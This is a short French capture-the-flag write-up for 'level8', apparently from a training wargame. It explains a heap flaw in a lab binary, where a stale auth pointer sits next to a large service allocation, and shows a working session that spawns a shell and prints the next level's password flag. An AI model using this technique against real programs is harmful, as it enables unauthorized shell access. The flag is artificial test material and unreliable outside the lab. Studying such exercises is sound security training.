# level8

Après avoir compris ce que fait le binaire en écrivant le `source.c`, on se rend compte que l'algo est `CLI` !

Durant `login`, il va regarder s'il y a un char à `auth + 0x20` \
Si oui il donne un shell, sinon rien d'intéressant. \
Or à l'`auth` on ne peut qu'allouer 4 bytes...

On voit également que lors du `reset`, le pointeur de `auth` n'est pas remis à `NULL`

On remarque aussi que lors de `service`, l'espace alloué est juste à côté de `auth`, on peut juste allouer un grand `service` après un `auth` et on pourra directement `login`

Tuto:
```
./level8
(nil), (nil)
auth AA
0x804a008, (nil)
service AAAAAAAAAAAAAAAAAAAAAAAAAAAA
0x804a008, 0x804a018
login
$ cat /home/user/level9/.pass
# c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
